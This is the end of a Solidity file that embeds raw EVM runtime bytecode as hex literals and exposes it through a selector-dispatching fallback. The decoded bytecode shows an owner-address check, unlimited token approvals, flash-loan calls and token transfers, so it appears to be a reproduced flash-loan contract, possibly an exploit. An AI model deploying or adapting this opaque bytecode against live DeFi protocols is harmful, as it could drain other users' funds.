            hex"ffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffff",
            hex"ff16146118cb57600080fd5b81600581905550806009819055507363cb0f59b7",
            hex"e67c7d4cb96214ca456597d85c587d6000806101000a81548173ffffffffffff",
            hex"ffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffff",
            hex"ffffffffffffffff16021790555060008060009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffff",
            hex"ffffffffffffff16636f2ef95b6005546040518263ffffffff1660e01b815260",
            hex"040161198b9190613f2b565b60006040518083038186803b1580156119a35760",
            hex"0080fd5b505afa1580156119b7573d6000803e3d6000fd5b505050506040513d",
            hex"6000823e3d601f19601f820116820180604052508101906119e09190613a7a56",
            hex"5b91505060008054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff1673ffffffffffffffffffffffffffffffffffffffff16630b2583c8",
            hex"600260009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff1673c08512927d12348f6620a698105e1baac6ecd9116402540be4006000",
            hex"650f285c0bd0686040518663ffffffff1660e01b8152600401611a8695949392",
            hex"9190613ccc565b600060405180830381600087803b158015611aa057600080fd",
            hex"5b505af1158015611ab4573d6000803e3d6000fd5b5050505080600181518110",
            hex"611acc57611acb61423a565b5b60200260200101516006819055508060008151",
            hex"8110611aee57611aed61423a565b5b6020026020010151600781905550611b04",
            hex"6134d3565b505050565b7314c19962e4a899f29b3dd9ff52ebfb5e4cb9a06773",
            hex"ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffff",
            hex"ffffffffffffffffffffff1614611b5557600080fd5b81600581905550806009",
            hex"8190555073cf3c8f51de189c8d5382713b716b133e485b99b76000806101000a",
            hex"81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffff",
            hex"ffffffffffffffffffffffffffffffffffff1602179055506000806000905490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff16636f2ef95b6005546040518263ff",
            hex"ffffff1660e01b8152600401611c159190613f2b565b60006040518083038186",
            hex"803b158015611c2d57600080fd5b505afa158015611c41573d6000803e3d6000",
            hex"fd5b505050506040513d6000823e3d601f19601f820116820180604052508101",
            hex"90611c6a9190613a7a565b91505080600181518110611c8157611c8061423a56",
            hex"5b5b602002602001015160068190555080600081518110611ca357611ca26142",
            hex"3a565b5b6020026020010151600781905550611cb96134d3565b505050565b73",
            hex"14c19962e4a899f29b3dd9ff52ebfb5e4cb9a06773ffffffffffffffffffffff",
            hex"ffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff",
            hex"1614611d0a57600080fd5b816005819055508060098190555073477658494c35",
            hex"41ba272a7120176d77674a0183ba6000806101000a81548173ffffffffffffff",
            hex"ffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffff",
            hex"ffffffffffffff16021790555060008060009054906101000a900473ffffffff",
            hex"ffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffff",
            hex"ffffffffffff16636f2ef95b6005546040518263ffffffff1660e01b81526004",
            hex"01611dca9190613f2b565b60006040518083038186803b158015611de2576000",
            hex"80fd5b505afa158015611df6573d6000803e3d6000fd5b505050506040513d60",
            hex"00823e3d601f19601f82011682018060405250810190611e1f9190613a7a565b",
            hex"91505080600181518110611e3657611e3561423a565b5b602002602001015160",
            hex"068190555080600081518110611e5857611e5761423a565b5b60200260200101",
            hex"51600781905550611e6e6134d3565b505050565b7314c19962e4a899f29b3dd9",
            hex"ff52ebfb5e4cb9a06773ffffffffffffffffffffffffffffffffffffffff1633",
            hex"73ffffffffffffffffffffffffffffffffffffffff1614611ebf57600080fd5b",
            hex"816005819055508060098190555060008060009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffff",
            hex"ffffffffffffff16636f2ef95b6005546040518263ffffffff1660e01b815260",
            hex"0401611f2b9190613f2b565b60006040518083038186803b158015611f435760",
            hex"0080fd5b505afa158015611f57573d6000803e3d6000fd5b505050506040513d",
            hex"6000823e3d601f19601f82011682018060405250810190611f809190613a7a56",
            hex"5b91505080600181518110611f9757611f9661423a565b5b6020026020010151",
            hex"60068190555080600081518110611fb957611fb861423a565b5b602002602001",
            hex"0151600781905550611fcf6134d3565b505050565b7314c19962e4a899f29b3d",
            hex"d9ff52ebfb5e4cb9a06773ffffffffffffffffffffffffffffffffffffffff16",
            hex"3373ffffffffffffffffffffffffffffffffffffffff161461202057600080fd",
            hex"5b600160009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360",
            hex"008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"715181065483d2f0eb9645be8b0600000000006040518363ffffffff1660e01b",
            hex"81526004016120af929190613e0f565b602060405180830381600087803b1580",
            hex"156120c957600080fd5b505af11580156120dd573d6000803e3d6000fd5b5050",
            hex"50506040513d601f19601f820116820180604052508101906121019190613a20",
            hex"565b50600260009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7",
            hex"b360008054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff16715181065483d2f0eb9645be8b0600000000006040518363ffffffff1660",
            hex"e01b8152600401612191929190613e0f565b602060405180830381600087803b",
            hex"1580156121ab57600080fd5b505af11580156121bf573d6000803e3d6000fd5b",
            hex"505050506040513d601f19601f820116820180604052508101906121e3919061",
            hex"3a20565b50600260009054906101000a900473ffffffffffffffffffffffffff",
            hex"ffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166309",
            hex"5ea7b37363cb0f59b7e67c7d4cb96214ca456597d85c587d715181065483d2f0",
            hex"eb9645be8b0600000000006040518363ffffffff1660e01b8152600401612267",
            hex"929190613e0f565b602060405180830381600087803b15801561228157600080",
            hex"fd5b505af1158015612295573d6000803e3d6000fd5b505050506040513d601f",
            hex"19601f820116820180604052508101906122b99190613a20565b5073c0851292",
            hex"7d12348f6620a698105e1baac6ecd91173ffffffffffffffffffffffffffffff",
            hex"ffffffffff1663095ea7b37363cb0f59b7e67c7d4cb96214ca456597d85c587d",
            hex"715181065483d2f0eb9645be8b0600000000006040518363ffffffff1660e01b",
            hex"815260040161232f929190613e0f565b602060405180830381600087803b1580",
            hex"1561234957600080fd5b505af115801561235d573d6000803e3d6000fd5b5050",
            hex"50506040513d601f19601f820116820180604052508101906123819190613a20",
            hex"565b50600260009054906101000a900473ffffffffffffffffffffffffffffff",
            hex"ffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7",
            hex"b373cf3c8f51de189c8d5382713b716b133e485b99b7715181065483d2f0eb96",
            hex"45be8b0600000000006040518363ffffffff1660e01b81526004016124059291",
            hex"90613e0f565b602060405180830381600087803b15801561241f57600080fd5b",
            hex"505af1158015612433573d6000803e3d6000fd5b505050506040513d601f1960",
            hex"1f820116820180604052508101906124579190613a20565b50732c537e5624e4",
            hex"af88a7ae4060c022609376c8d0eb73ffffffffffffffffffffffffffffffffff",
            hex"ffffff1663095ea7b373cf3c8f51de189c8d5382713b716b133e485b99b77151",
            hex"81065483d2f0eb9645be8b0600000000006040518363ffffffff1660e01b8152",
            hex"6004016124cd929190613e0f565b602060405180830381600087803b15801561",
            hex"24e757600080fd5b505af11580156124fb573d6000803e3d6000fd5b50505050",
            hex"6040513d601f19601f8201168201806040525081019061251f9190613a20565b",
            hex"50600260009054906101000a900473ffffffffffffffffffffffffffffffffff",
            hex"ffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b373",
            hex"764a5a29f982d3513e76fe07df2034821fbdba72715181065483d2f0eb9645be",
            hex"8b0600000000006040518363ffffffff1660e01b81526004016125a392919061",
            hex"3e0f565b602060405180830381600087803b1580156125bd57600080fd5b505a",
            hex"f11580156125d1573d6000803e3d6000fd5b505050506040513d601f19601f82",
            hex"0116820180604052508101906125f59190613a20565b5073da446fad08277b4d",
            hex"2591536f204e018f32b6831c73ffffffffffffffffffffffffffffffffffffff",
            hex"ff1663095ea7b373764a5a29f982d3513e76fe07df2034821fbdba7271518106",
            hex"5483d2f0eb9645be8b0600000000006040518363ffffffff1660e01b81526004",
            hex"0161266b929190613e0f565b602060405180830381600087803b158015612685",
            hex"57600080fd5b505af1158015612699573d6000803e3d6000fd5b505050506040",
            hex"513d601f19601f820116820180604052508101906126bd9190613a20565b5060",
            hex"0260009054906101000a900473ffffffffffffffffffffffffffffffffffffff",
            hex"ff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3739a6c",
            hex"7ae10eb82a0d7dc3c296ecbc2e2bdc53e80b715181065483d2f0eb9645be8b06",
            hex"00000000006040518363ffffffff1660e01b8152600401612741929190613e0f",
            hex"565b602060405180830381600087803b15801561275b57600080fd5b505af115",
            hex"801561276f573d6000803e3d6000fd5b505050506040513d601f19601f820116",
            hex"820180604052508101906127939190613a20565b507370e8de73ce538da2beed",
            hex"35d14187f6959a8eca9673ffffffffffffffffffffffffffffffffffffffff16",
            hex"63095ea7b3739a6c7ae10eb82a0d7dc3c296ecbc2e2bdc53e80b715181065483",
            hex"d2f0eb9645be8b0600000000006040518363ffffffff1660e01b815260040161",
            hex"2809929190613e0f565b602060405180830381600087803b1580156128235760",
            hex"0080fd5b505af1158015612837573d6000803e3d6000fd5b505050506040513d",
            hex"601f19601f8201168201806040525081019061285b9190613a20565b50600260",
            hex"009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"73ffffffffffffffffffffffffffffffffffffffff1663095ea7b37347765849",
            hex"4c3541ba272a7120176d77674a0183ba715181065483d2f0eb9645be8b060000",
            hex"0000006040518363ffffffff1660e01b81526004016128df929190613e0f565b",
            hex"602060405180830381600087803b1580156128f957600080fd5b505af1158015",
            hex"61290d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201",
            hex"80604052508101906129319190613a20565b50731abaea1f7c830bd89acc67ec",
            hex"4af516284b1bc33c73ffffffffffffffffffffffffffffffffffffffff166309",
            hex"5ea7b373477658494c3541ba272a7120176d77674a0183ba715181065483d2f0",
            hex"eb9645be8b0600000000006040518363ffffffff1660e01b81526004016129a7",
            hex"929190613e0f565b602060405180830381600087803b1580156129c157600080",
            hex"fd5b505af11580156129d5573d6000803e3d6000fd5b505050506040513d601f",
            hex"19601f820116820180604052508101906129f99190613a20565b506002600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ff",
            hex"ffffffffffffffffffffffffffffffffffffff1663095ea7b373f3d7aa346965",
            hex"656e7c65fb4135531e0c2270af83715181065483d2f0eb9645be8b0600000000",
            hex"006040518363ffffffff1660e01b8152600401612a7d929190613e0f565b6020",
            hex"60405180830381600087803b158015612a9757600080fd5b505af1158015612a",
            hex"ab573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060",
            hex"405250810190612acf9190613a20565b5073cadc0acd4b445166f12d2c07eac6",
            hex"e2544fbe2eef73ffffffffffffffffffffffffffffffffffffffff1663095ea7",
            hex"b373f3d7aa346965656e7c65fb4135531e0c2270af83715181065483d2f0eb96",
            hex"45be8b0600000000006040518363ffffffff1660e01b8152600401612b459291",
            hex"90613e0f565b602060405180830381600087803b158015612b5f57600080fd5b",
            hex"505af1158015612b73573d6000803e3d6000fd5b505050506040513d601f1960",
            hex"1f82011682018060405250810190612b979190613a20565b50565b6000805490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff1663e2bbb158600554650f285c0bd0",
            hex"686040518363ffffffff1660e01b8152600401612bfd929190613f46565b6000",
            hex"60405180830381600087803b158015612c1757600080fd5b505af1158015612c",
            hex"2b573d6000803e3d6000fd5b5050505050505050565b60065460026000905490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff166370a08231306040518263ffffff",
            hex"ff1660e01b8152600401612c939190613cb1565b60206040518083038186803b",
            hex"158015612cab57600080fd5b505afa158015612cbf573d6000803e3d6000fd5b",
            hex"505050506040513d601f19601f82011682018060405250810190612ce3919061",
            hex"3a4d565b10158015612d9b57506000600160009054906101000a900473ffffff",
            hex"ffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffff",
            hex"ffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401",
            hex"612d499190613cb1565b60206040518083038186803b158015612d6157600080",
            hex"fd5b505afa158015612d75573d6000803e3d6000fd5b505050506040513d601f",
            hex"19601f82011682018060405250810190612d999190613a4d565b145b15612e3c",
            hex"5782600881905550600460009054906101000a900473ffffffffffffffffffff",
            hex"ffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff",
            hex"1663490e6cbc3060006007546040518463ffffffff1660e01b8152600401612e",
            hex"0993929190613dc5565b600060405180830381600087803b158015612e235760",
            hex"0080fd5b505af1158015612e37573d6000803e3d6000fd5b505050505b600654",
            hex"600260009054906101000a900473ffffffffffffffffffffffffffffffffffff",
            hex"ffff1673ffffffffffffffffffffffffffffffffffffffff166370a082313060",
            hex"40518263ffffffff1660e01b8152600401612e9a9190613cb1565b6020604051",
            hex"8083038186803b158015612eb257600080fd5b505afa158015612ec6573d6000",
            hex"803e3d6000fd5b505050506040513d601f19601f820116820180604052508101",
            hex"90612eea9190613a4d565b10158015612fa45750600754600160009054906101",
            hex"000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffff",
            hex"ffffffffffffffffffffffffffffff166370a08231306040518263ffffffff16",
            hex"60e01b8152600401612f519190613cb1565b60206040518083038186803b1580",
            hex"15612f6957600080fd5b505afa158015612f7d573d6000803e3d6000fd5b5050",
            hex"50506040513d601f19601f82011682018060405250810190612fa19190613a4d",
            hex"565b10155b156132e057612fb16134d3565b600260009054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffff",
            hex"ffffffffffffffffffff1663a9059cbb600360009054906101000a900473ffff",
            hex"ffffffffffffffffffffffffffffffffffff1661302960085460065461371b90",
            hex"919063ffffffff16565b6040518363ffffffff1660e01b815260040161304692",
            hex"9190613e38565b602060405180830381600087803b15801561306057600080fd",
            hex"5b505af1158015613074573d6000803e3d6000fd5b505050506040513d601f19",
            hex"601f820116820180604052508101906130989190613a20565b50600160009054",
            hex"906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffff",
            hex"ffffffffffffffffffffffffffffffffffff1663a9059cbb6004600090549061",
            hex"01000a900473ffffffffffffffffffffffffffffffffffffffff1661310f8660",
            hex"075461371b90919063ffffffff16565b6040518363ffffffff1660e01b815260",
            hex"040161312c929190613e38565b602060405180830381600087803b1580156131",
            hex"4657600080fd5b505af115801561315a573d6000803e3d6000fd5b5050505060",
            hex"40513d601f19601f8201168201806040525081019061317e9190613a20565b50",
            hex"6000600260009054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231",
            hex"306040518263ffffffff1660e01b81526004016131dc9190613cb1565b602060",
            hex"40518083038186803b1580156131f457600080fd5b505afa158015613208573d",
            hex"6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250",
            hex"81019061322c9190613a4d565b90506000600160009054906101000a900473ff",
            hex"ffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffff",
            hex"ffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260",
            hex"040161328b9190613cb1565b60206040518083038186803b1580156132a35760",
            hex"0080fd5b505afa1580156132b7573d6000803e3d6000fd5b505050506040513d",
            hex"601f19601f820116820180604052508101906132db9190613a4d565b90505050",
            hex"5b50505050565b7314c19962e4a899f29b3dd9ff52ebfb5e4cb9a06773ffffff",
            hex"ffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffff",
            hex"ffffffffffffffff161461333257600080fd5b81600581905550806009819055",
            hex"5060008060009054906101000a900473ffffffffffffffffffffffffffffffff",
            hex"ffffffff1673ffffffffffffffffffffffffffffffffffffffff16636f2ef95b",
            hex"6005546040518263ffffffff1660e01b815260040161339e9190613f2b565b60",
            hex"006040518083038186803b1580156133b657600080fd5b505afa1580156133ca",
            hex"573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116",
            hex"820180604052508101906133f39190613a7a565b915050806001815181106134",
            hex"0a5761340961423a565b5b602002602001015160068190555080600081518110",
            hex"61342c5761342b61423a565b5b60200260200101516007819055506003600090",
            hex"54906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ff",
            hex"ffffffffffffffffffffffffffffffffffffff1663490e6cbc30600060065460",
            hex"40518463ffffffff1660e01b815260040161349c93929190613dc5565b600060",
            hex"405180830381600087803b1580156134b657600080fd5b505af11580156134ca",
            hex"573d6000803e3d6000fd5b50505050505050565b60008054906101000a900473",
            hex"ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffff",
            hex"ffffffffffffffffffff1663490e6cbc3061354f61353e6103e8613530600954",
            hex"60075461377490919063ffffffff16565b6137e190919063ffffffff16565b60",
            hex"075461383f90919063ffffffff16565b61358e61357d6103e861356f60095460",
            hex"065461377490919063ffffffff16565b6137e190919063ffffffff16565b6006",
            hex"5461383f90919063ffffffff16565b6040518463ffffffff1660e01b81526004",
            hex"016135ac93929190613e61565b600060405180830381600087803b1580156135",
            hex"c657600080fd5b505af11580156135da573d6000803e3d6000fd5b5050505060",
            hex"008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16",
            hex"73ffffffffffffffffffffffffffffffffffffffff1663441a3e706000805490",
            hex"6101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffff",
            hex"ffffffffffffffffffffffffffffffffff166370a08231306040518263ffffff",
            hex"ff1660e01b81526004016136739190613cb1565b60206040518083038186803b",
            hex"15801561368b57600080fd5b505afa15801561369f573d6000803e3d6000fd5b",
            hex"505050506040513d601f19601f820116820180604052508101906136c3919061",
            hex"3a4d565b650f285c0bd0686040518363ffffffff1660e01b81526004016136e7",
            hex"929190613f46565b600060405180830381600087803b15801561370157600080",
            hex"fd5b505af1158015613715573d6000803e3d6000fd5b50505050565b60008282",
            hex"8461372a9190613fe2565b915081101561376e576040517f08c379a000000000",
            hex"0000000000000000000000000000000000000000000000008152600401613765",
            hex"90613ecb565b60405180910390fd5b92915050565b60008082148061379c5750",
            hex"8282838561378d9190614069565b92508261379a9190614038565b145b6137db",
            hex"576040517f08c379a00000000000000000000000000000000000000000000000",
            hex"000000000081526004016137d290613eab565b60405180910390fd5b92915050",
            hex"565b6000808211613825576040517f08c379a000000000000000000000000000",
            abi.encode(address(0x000000815260040161381c90613F0B565B604051)),
            hex"80910390fd5b600082846138339190614038565b90508091505092915050565b",
            hex"600082828461384e91906140c3565b9150811115613892576040517f08c379a0",
            hex"0000000000000000000000000000000000000000000000000000000081526004",
            hex"0161388990613eeb565b60405180910390fd5b92915050565b60006138ab6138",
            hex"a684613f94565b613f6f565b9050808382526020820190508285602086028201",
            hex"11156138ce576138cd6142a2565b5b60005b858110156138fe57816138e48882",
            hex"6139cb565b8452602084019350602083019250506001810190506138d1565b50",
            hex"50509392505050565b6000813590506139178161438f565b92915050565b6000",
            hex"82601f8301126139325761393161429d565b5b81516139428482602086016138",
            hex"98565b91505092915050565b60008151905061395a816143a6565b9291505056",
            hex"5b60008083601f8401126139765761397561429d565b5b8235905067ffffffff",
            hex"ffffffff81111561399357613992614298565b5b602083019150836001820283",
            hex"0111156139af576139ae6142a2565b5b9250929050565b6000813590506139c5",
            hex"816143bd565b92915050565b6000815190506139da816143bd565b9291505056",
            hex"5b600080604083850312156139f7576139f66142ac565b5b6000613a05858286",
            hex"01613908565b9250506020613a16858286016139b6565b915050925092905056",
            hex"5b600060208284031215613a3657613a356142ac565b5b6000613a4484828501",
            hex"61394b565b91505092915050565b600060208284031215613a6357613a626142",
            hex"ac565b5b6000613a71848285016139cb565b91505092915050565b6000806040",
            hex"8385031215613a9157613a906142ac565b5b6000613a9f858286016139cb565b",
            hex"925050602083015167ffffffffffffffff811115613ac057613abf6142a7565b",
            hex"5b613acc8582860161391d565b9150509250929050565b600080604083850312",
            hex"15613aed57613aec6142ac565b5b6000613afb858286016139b6565b92505060",
            hex"20613b0c858286016139b6565b9150509250929050565b600080600080606085",
            hex"87031215613b3057613b2f6142ac565b5b6000613b3e878288016139b6565b94",
            hex"50506020613b4f878288016139b6565b935050604085013567ffffffffffffff",
            hex"ff811115613b7057613b6f6142a7565b5b613b7c87828801613960565b925092",
            hex"505092959194509250565b613b93816140f7565b82525050565b613ba2816141",
            hex"3f565b82525050565b613bb181614151565b82525050565b613bc08161416356",
            hex"5b82525050565b613bcf81614175565b82525050565b613bde81614187565b82",
            hex"525050565b613bed81614199565b82525050565b6000613c00601483613fd156",
            hex"5b9150613c0b826142c2565b602082019050919050565b6000613c2360148361",
            hex"3fd1565b9150613c2e826142eb565b602082019050919050565b6000613c4660",
            hex"0d83613fd1565b9150613c5182614314565b602082019050919050565b600061",
            hex"3c69600b83613fc0565b9150613c748261433d565b602082019050919050565b",
            hex"6000613c8c601283613fd1565b9150613c9782614366565b6020820190509190",
            hex"50565b613cab81614135565b82525050565b6000602082019050613cc6600083",
            hex"0184613b8a565b92915050565b600060a082019050613ce16000830188613b8a",
            hex"565b613cee6020830187613b8a565b613cfb6040830186613ba8565b613d0860",
            hex"60830185613b99565b613d156080830184613bb7565b9695505050505050565b",
            hex"600060a082019050613d346000830188613b8a565b613d416020830187613b8a",
            hex"565b613d4e6040830186613bc6565b613d5b6060830185613b99565b613d6860",
            hex"80830184613bb7565b9695505050505050565b600060a082019050613d876000",
            hex"830188613b8a565b613d946020830187613b8a565b613da16040830186613bd5",
            hex"565b613dae6060830185613b99565b613dbb6080830184613bb7565b96955050",
            hex"50505050565b6000608082019050613dda6000830186613b8a565b613de76020",
            hex"830185613b99565b613df46040830184613ca2565b8181036060830152613e05",
            hex"81613c5c565b9050949350505050565b6000604082019050613e246000830185",
            hex"613b8a565b613e316020830184613be4565b9392505050565b60006040820190",
            hex"50613e4d6000830185613b8a565b613e5a6020830184613ca2565b9392505050",
            hex"565b6000608082019050613e766000830186613b8a565b613e83602083018561",
            hex"3ca2565b613e906040830184613ca2565b8181036060830152613ea181613c5c",
            hex"565b9050949350505050565b60006020820190508181036000830152613ec481",
            hex"613bf3565b9050919050565b60006020820190508181036000830152613ee481",
            hex"613c16565b9050919050565b60006020820190508181036000830152613f0481",
            hex"613c39565b9050919050565b60006020820190508181036000830152613f2481",
            hex"613c7f565b9050919050565b6000602082019050613f406000830184613ca256",
            hex"5b92915050565b6000604082019050613f5b6000830185613ca2565b613f6860",
            hex"20830184613bb7565b9392505050565b6000613f79613f8a565b9050613f8582",
            hex"826141ab565b919050565b6000604051905090565b600067ffffffffffffffff",
            hex"821115613faf57613fae614269565b5b60208202905060208101905091905056",
            hex"5b600082825260208201905092915050565b6000828252602082019050929150",
            hex"50565b6000613fed82614135565b9150613ff883614135565b9250827fffffff",
            hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211",
            hex"1561402d5761402c6141dc565b5b828201905092915050565b60006140438261",
            hex"4135565b915061404e83614135565b92508261405e5761405d61420b565b5b82",
            hex"8204905092915050565b600061407482614135565b915061407f83614135565b",
            hex"9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
            hex"ffffffff04831182151516156140b8576140b76141dc565b5b82820290509291",
            hex"5050565b60006140ce82614135565b91506140d983614135565b925082821015",
            hex"6140ec576140eb6141dc565b5b828203905092915050565b6000614102826141",
            hex"15565b9050919050565b60008115159050919050565b600073ffffffffffffff",
            hex"ffffffffffffffffffffffffff82169050919050565b6000819050919050565b",
            hex"600061414a82614135565b9050919050565b600061415c82614135565b905091",
            hex"9050565b600061416e82614135565b9050919050565b60006141808261413556",
            hex"5b9050919050565b600061419282614135565b9050919050565b60006141a482",
            hex"614135565b9050919050565b6141b4826142b1565b810181811067ffffffffff",
            hex"ffffff821117156141d3576141d2614269565b5b80604052505050565b7f4e48",
            hex"7b71000000000000000000000000000000000000000000000000000000006000",
            hex"52601160045260246000fd5b7f4e487b71000000000000000000000000000000",
            abi.encode(address(0x00600052601260045260246000Fd5B7F4E487B71)),
            hex"0000000000000000000000000000000000000000000000000000000060005260",
            hex"3260045260246000fd5b7f4e487b710000000000000000000000000000000000",
            hex"0000000000000000000000600052604160045260246000fd5b600080fd5b6000",
            hex"80fd5b600080fd5b600080fd5b600080fd5b6000601f19601f83011690509190",
            hex"50565b7f64732d6d6174682d6d756c2d6f766572666c6f770000000000000000",
            hex"00000000600082015250565b7f64732d6d6174682d6164642d6f766572666c6f",
            hex"77000000000000000000000000600082015250565b7f7375622d756e64657266",
            hex"6c6f7700000000000000000000000000000000000000600082015250565b7f30",
            hex"7863616c6c666c61736800000000000000000000000000000000000000000060",
            hex"0082015250565b7f556e6469766973696f6e206279207a65726f000000000000",
            hex"0000000000000000600082015250565b614398816140f7565b81146143a35760",
            hex"0080fd5b50565b6143af81614109565b81146143ba57600080fd5b50565b6143",
            hex"c681614135565b81146143d157600080fd5b5056fea264697066735822122028",
            hex"1101a23f7c5d6adda1ebdbae3d3b459d01f813167b0e6214fc9e39b7d55f2364",
            hex"736f6c63430008070033"
        );
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x06853c3a) {
            x06853c3a();
            return;
        }
        if (selector == 0xf1f3a66a) {
            xf1f3a66a();
            return;
        }
        revert("no such function");
    }
}
